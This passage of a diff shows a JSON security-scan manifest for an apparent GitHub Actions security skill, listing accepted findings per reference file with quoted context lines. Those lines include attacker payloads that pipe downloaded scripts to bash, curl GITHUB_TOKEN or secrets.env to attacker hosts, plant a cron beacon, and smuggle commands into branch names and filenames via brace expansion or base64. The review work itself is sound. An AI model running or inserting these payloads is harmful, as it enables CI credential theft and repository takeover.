+          "line": 98,
+          "evidence": "secret",
+          "context": "    echo \"Encoded key: $ENCODED\"  # GitHub only masks the original secret value",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 101,
+          "evidence": "secret",
+          "context": "GitHub Actions automatically masks secret values in logs, but **derived values** (base64-encoded, truncated, transformed) are NOT masked.",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "encoded-content",
+          "line": 101,
+          "evidence": "base64",
+          "context": "GitHub Actions automatically masks secret values in logs, but **derived values** (base64-encoded, truncated, transformed) are NOT masked.",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "credential-access",
+          "line": 109,
+          "evidence": "secret",
+          "context": "    # If this file ends up in an artifact, the secret is exposed",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "shell-execution",
+          "line": 128,
+          "evidence": "sh",
+          "context": "      - run: ./build.sh  # Fork code can read all secrets via ${{ secrets.* }}",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "credential-access",
+          "line": 131,
+          "evidence": "secret",
+          "context": "**Important:** Secrets are available to `pull_request_target` workflows. Combined with fork checkout, this exposes every secret to attacker code.",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "shell-execution",
+          "line": 137,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "credential-access",
+          "line": 147,
+          "evidence": "secret",
+          "context": "# Find secret usage",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 229,
+          "evidence": "Secret",
+          "context": "### Secret Scoping with Environments",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "network-access",
+          "line": 263,
+          "evidence": "https://",
+          "context": "- [GitHub Docs: Permissions for GITHUB_TOKEN](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 264,
+          "evidence": "https://",
+          "context": "- [GitHub Docs: Using OIDC for cloud deployments](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 265,
+          "evidence": "https://",
+          "context": "- [GitHub Blog: Security hardening — Permissions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        }
+      ]
+    },
+    {
+      "path": "references/pwn-request.md",
+      "sha256": "6dd84c91ce77d57883059edf95c2f1c64ea1ec39551c5c8208e0cadb9c3ca673",
+      "bytes": 5902,
+      "mode": "100644",
+      "git_blob": "0a2046843146aaff7dd09e303715e0bda0e0db89",
+      "license": "Apache-2.0",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "Covered by the repository-root Apache-2.0 license; no file-level notice says otherwise.",
+      "findings": [
+        {
+          "type": "package-install",
+          "line": 24,
+          "evidence": "npm install",
+          "context": "      - run: npm install && npm test  # Executes attacker's code",
+          "disposition": "accepted",
+          "reason": "npm install / npm ci / go run appear inside example vulnerable workflows showing how fork code executes; the agent is not told to install anything."
+        },
+        {
+          "type": "shell-execution",
+          "line": 47,
+          "evidence": "bash",
+          "context": "    _ = exec.Command(\"bash\", \"-c\",",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 48,
+          "evidence": "curl",
+          "context": "        `curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" \\",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 50,
+          "evidence": "https://",
+          "context": "        https://attacker.com/collect`).Run()",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 61,
+          "evidence": "curl",
+          "context": "    \"preinstall\": \"curl -sSfL https://attacker.com/steal | bash\"",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 61,
+          "evidence": "https://",
+          "context": "    \"preinstall\": \"curl -sSfL https://attacker.com/steal | bash\"",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 61,
+          "evidence": "bash",
+          "context": "    \"preinstall\": \"curl -sSfL https://attacker.com/steal | bash\"",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "package-install",
+          "line": 66,
+          "evidence": "npm install",
+          "context": "Any `npm install`, `npm ci`, or `npm test` (which often installs first) will execute these scripts.",
+          "disposition": "accepted",
+          "reason": "npm install / npm ci / go run appear inside example vulnerable workflows showing how fork code executes; the agent is not told to install anything."
+        },
+        {
+          "type": "network-access",
+          "line": 77,
+          "evidence": "curl",
+          "context": "        os.system(f\"curl -d token=$GITHUB_TOKEN https://attacker.com/collect\")",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 77,
+          "evidence": "https://",
+          "context": "        os.system(f\"curl -d token=$GITHUB_TOKEN https://attacker.com/collect\")",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 93,
+          "evidence": "curl",
+          "context": "    - run: curl -sSfL https://attacker.com/steal | bash",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 93,
+          "evidence": "https://",
+          "context": "    - run: curl -sSfL https://attacker.com/steal | bash",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 93,
+          "evidence": "bash",
+          "context": "    - run: curl -sSfL https://attacker.com/steal | bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 94,
+          "evidence": "bash",
+          "context": "      shell: bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 96,
+          "evidence": "bash",
+          "context": "      shell: bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "filesystem-write",
+          "line": 99,
+          "evidence": "delete",
+          "context": "**Real-world:** Used against trivy (25k+ stars). The attacker modified `.github/actions/setup-go/action.yaml` to inject a payload. The \"Set up Go\" step took 5+ minutes (vs. normal seconds), and the stolen PAT was used to rename the repo, de",
+          "disposition": "accepted",
+          "reason": "Redirections such as echo > token.txt or >> $GITHUB_STEP_SUMMARY appear only inside example workflows and attacker payloads; the skill writes no files."
+        },
+        {
+          "type": "network-access",
+          "line": 109,
+          "evidence": "curl",
+          "context": "\t@curl -sSfL https://attacker.com/steal | bash",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 109,
+          "evidence": "https://",
+          "context": "\t@curl -sSfL https://attacker.com/steal | bash",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 109,
+          "evidence": "bash",
+          "context": "\t@curl -sSfL https://attacker.com/steal | bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 117,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "package-install",
+          "line": 148,
+          "evidence": "npm install",
+          "context": "      - run: npm install && npm test",
+          "disposition": "accepted",
+          "reason": "npm install / npm ci / go run appear inside example vulnerable workflows showing how fork code executes; the agent is not told to install anything."
+        },
+        {
+          "type": "network-access",
+          "line": 209,
+          "evidence": "https://",
+          "context": "- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure (pwn requests)](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 210,
+          "evidence": "https://",
+          "context": "- [HackerBot Claw campaign — awesome-go and trivy attacks](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        }
+      ]
+    },
+    {
+      "path": "references/real-world-attacks.md",
+      "sha256": "761260977a220264a1ee30e0b961618495723c2e6cc4e91893b7d9d4a9408718",
+      "bytes": 9468,
+      "mode": "100644",
+      "git_blob": "2b24e2a5b30a0463d2a750d752a68d9b05799418",
+      "license": "Apache-2.0",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "Covered by the repository-root Apache-2.0 license; no file-level notice says otherwise.",
+      "findings": [
+        {
+          "type": "encoded-content",
+          "line": 19,
+          "evidence": "Base64",
+          "context": "| Mar 2, 05:57 | RustPython/RustPython | — | Base64 branch injection | Partial execution |",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "shell-execution",
+          "line": 47,
+          "evidence": "bash",
+          "context": "    _ = exec.Command(\"bash\", \"-c\",",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 48,
+          "evidence": "curl",
+          "context": "        `curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" \\",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 50,
+          "evidence": "https://",
+          "context": "        https://recv.hackmoltrepeat.com/ && \\",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 51,
+          "evidence": "curl",
+          "context": "        curl -sSfL https://hackmoltrepeat.com/molt | bash`).Run()",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 51,
+          "evidence": "https://",
+          "context": "        curl -sSfL https://hackmoltrepeat.com/molt | bash`).Run()",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 51,
+          "evidence": "bash",
+          "context": "        curl -sSfL https://hackmoltrepeat.com/molt | bash`).Run()",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "credential-access",
+          "line": 69,
+          "evidence": "Credential",
+          "context": "**Category:** Credential Escalation",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "shell-execution",
+          "line": 87,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 88,
+          "evidence": "curl",
+          "context": "curl -sSfL https://hackmoltrepeat.com/molt | bash",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 88,
+          "evidence": "https://",
+          "context": "curl -sSfL https://hackmoltrepeat.com/molt | bash",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 88,
+          "evidence": "bash",
+          "context": "curl -sSfL https://hackmoltrepeat.com/molt | bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 104,
+          "evidence": "curl",
+          "context": "- `curl` command visible in build logs",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 130,
+          "evidence": "curl",
+          "context": "dev$({curl,-sSfL,hackmoltrepeat.com/molt}${IFS}|${IFS}bash)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 130,
+          "evidence": "bash",
+          "context": "dev$({curl,-sSfL,hackmoltrepeat.com/molt}${IFS}|${IFS}bash)",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 135,
+          "evidence": "curl",
+          "context": "- `$({curl,-sSfL,...})` is brace expansion + command substitution",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 136,
+          "evidence": "bash",
+          "context": "- Pipe to `bash` executes downloaded script",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 141,
+          "evidence": "curl",
+          "context": "- Downstream workflow file corrupted with curl output instead of branch name",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "encoded-content",
+          "line": 156,
+          "evidence": "Base64",
+          "context": "Base64-encoded shell commands embedded in filenames:",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "encoded-content",
+          "line": 159,
+          "evidence": "base64",
+          "context": "documentation/rules/$(echo${IFS}Y3VybCAtc1NmTCBoYWNr...${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash).md",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "shell-execution",
+          "line": 159,
+          "evidence": "bash",
+          "context": "documentation/rules/$(echo${IFS}Y3VybCAtc1NmTCBoYWNr...${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash).md",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "encoded-content",
+          "line": 166,
+          "evidence": "base64",
+          "context": "DataDog deployed emergency fixes within 9 hours (PR #9, Feb 27). Build logs showed base64 decoding errors with 2.5-minute execution gap, confirming shell injection fired.",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "shell-execution",
+          "line": 227,
+          "evidence": "sh",
+          "context": "      - run: ./version.sh -u -n",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 232,
+          "evidence": "sh",
+          "context": "1. Attacker opened PR modifying `version.sh` to inject payload at the top:",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 233,
+          "evidence": "bash",
+          "context": "   ```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 234,
+          "evidence": "bash",
+          "context": "   #!/usr/bin/env bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 235,
+          "evidence": "curl",
+          "context": "   curl -sSfL https://hackmoltrepeat.com/molt | bash",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 235,
+          "evidence": "https://",
+          "context": "   curl -sSfL https://hackmoltrepeat.com/molt | bash",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 235,
+          "evidence": "bash",
+          "context": "   curl -sSfL https://hackmoltrepeat.com/molt | bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 240,
+          "evidence": "sh",
+          "context": "4. Fork's `version.sh` executed with repo permissions",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "encoded-content",
+          "line": 253,
+          "evidence": "Base64",
+          "context": "## Attack 7: RustPython — Base64 Branch Name Injection",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "encoded-content",
+          "line": 260,
+          "evidence": "base64",
+          "context": "Similar to the Microsoft attack but using base64-encoded payload in the branch name. The attack achieved partial execution before being detected.",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "encoded-content",
+          "line": 264,
+          "evidence": "Base64",
+          "context": "Base64 encoding is a common evasion technique for branch name and filename injection. The decoded payload is the same `curl | bash` pattern.",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "encoded-content",
+          "line": 264,
+          "evidence": "decoded payload",
+          "context": "Base64 encoding is a common evasion technique for branch name and filename injection. The decoded payload is the same `curl | bash` pattern.",
+          "disposition": "accepted",
+          "reason": "base64 strings and base64 pipes are documented attacker obfuscation techniques in injection examples (e.g. expression-injection.md:67), shown for detection, not executed."
+        },
+        {
+          "type": "network-access",
+          "line": 264,
+          "evidence": "curl",
+          "context": "Base64 encoding is a common evasion technique for branch name and filename injection. The decoded payload is the same `curl | bash` pattern.",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 264,
+          "evidence": "bash",
+          "context": "Base64 encoding is a common evasion technique for branch name and filename injection. The decoded payload is the same `curl | bash` pattern.",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 271,
+          "evidence": "curl",
+          "context": "2. **Same payload delivery:** `curl -sSfL [url] | bash` pattern in every attack",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 271,
+          "evidence": "bash",
+          "context": "2. **Same payload delivery:** `curl -sSfL [url] | bash` pattern in every attack",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "credential-access",
+          "line": 283,
+          "evidence": "credential",
+          "context": "- Pwn request → awesome-go or trivy (depending on credential scope)",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "credential-access",
+          "line": 287,
+          "evidence": "Credential",
+          "context": "- Credential theft → trivy (worst-case scenario)",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "network-access",
+          "line": 295,
+          "evidence": "https://",
+          "context": "- [StepSecurity: HackerBot Claw — GitHub Actions Exploitation](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 296,
+          "evidence": "https://",
+          "context": "- [Aqua Security: Trivy incident response](https://www.aquasec.com/blog/trivy-github-repository-compromised/)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        }
+      ]
+    },
+    {
+      "path": "references/runner-infrastructure.md",
+      "sha256": "cb427fa29c34c10aef18766441e0be8e0123632bb87c307bdb8d1c40b47fc81e",
+      "bytes": 8040,
+      "mode": "100644",
+      "git_blob": "6aafbdbf62e29cc3ca6355bd31bc3780672f9120",
+      "license": "Apache-2.0",
+      "covered_by": "LICENSE.txt",
+      "license_reason": "Covered by the repository-root Apache-2.0 license; no file-level notice says otherwise.",
+      "findings": [
+        {
+          "type": "package-install",
+          "line": 23,
+          "evidence": "npm install",
+          "context": "      - run: npm install && npm test",
+          "disposition": "accepted",
+          "reason": "npm install / npm ci / go run appear inside example vulnerable workflows showing how fork code executes; the agent is not told to install anything."
+        },
+        {
+          "type": "credential-access",
+          "line": 28,
+          "evidence": "Credential",
+          "context": "#### Credential Persistence",
+          "disposition": "accepted",
+          "reason": "GITHUB_TOKEN, PAT, secrets.* and cloud key names appear in workflow examples and blast-radius tables used to assess exposure; no instruction to read, print or send real secrets."
+        },
+        {
+          "type": "shell-execution",
+          "line": 30,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 34,
+          "evidence": "curl",
+          "context": "echo '* * * * * curl https://attacker.com/beacon' >> /var/spool/cron/crontabs/runner",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 34,
+          "evidence": "https://",
+          "context": "echo '* * * * * curl https://attacker.com/beacon' >> /var/spool/cron/crontabs/runner",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "filesystem-write",
+          "line": 37,
+          "evidence": "mkdir",
+          "context": "mkdir -p ~/.ssh",
+          "disposition": "accepted",
+          "reason": "Redirections such as echo > token.txt or >> $GITHUB_STEP_SUMMARY appear only inside example workflows and attacker payloads; the skill writes no files."
+        },
+        {
+          "type": "shell-execution",
+          "line": 48,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "shell-execution",
+          "line": 50,
+          "evidence": "bash",
+          "context": "nohup bash -c 'while true; do",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 52,
+          "evidence": "curl",
+          "context": "    curl -d @/home/runner/work/*/secrets.env https://attacker.com/collect",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 52,
+          "evidence": "https://",
+          "context": "    curl -d @/home/runner/work/*/secrets.env https://attacker.com/collect",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "shell-execution",
+          "line": 62,
+          "evidence": "bash",
+          "context": "```bash",
+          "disposition": "accepted",
+          "reason": "Read-only grep/ls detection commands over .github/workflows plus shell snippets inside vulnerable-workflow and attacker-payload examples that the agent is not told to run."
+        },
+        {
+          "type": "network-access",
+          "line": 68,
+          "evidence": "curl",
+          "context": "curl http://internal-api.corp.example.com/admin",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 68,
+          "evidence": "http://",
+          "context": "curl http://internal-api.corp.example.com/admin",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 70,
+          "evidence": "curl",
+          "context": "curl http://169.254.169.254/latest/meta-data/  # Cloud metadata (example of attack vector)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "network-access",
+          "line": 70,
+          "evidence": "http://",
+          "context": "curl http://169.254.169.254/latest/meta-data/  # Cloud metadata (example of attack vector)",
+          "disposition": "accepted",
+          "reason": "URLs are documentation/blog references and attacker URLs inside illustrative payload examples; the skill never instructs the agent to fetch or call them."
+        },
+        {
+          "type": "package-install",
+          "line": 100,
+          "evidence": "npm install",
+          "context": "  - run: npm install  # Fork's package.json may install malicious deps",
+          "disposition": "accepted",
+          "reason": "npm install / npm ci / go run appear inside example vulnerable workflows showing how fork code executes; the agent is not told to install anything."
+        },
+        {
+          "type": "shell-execution",
+          "line": 157,
+          "evidence": "sh",
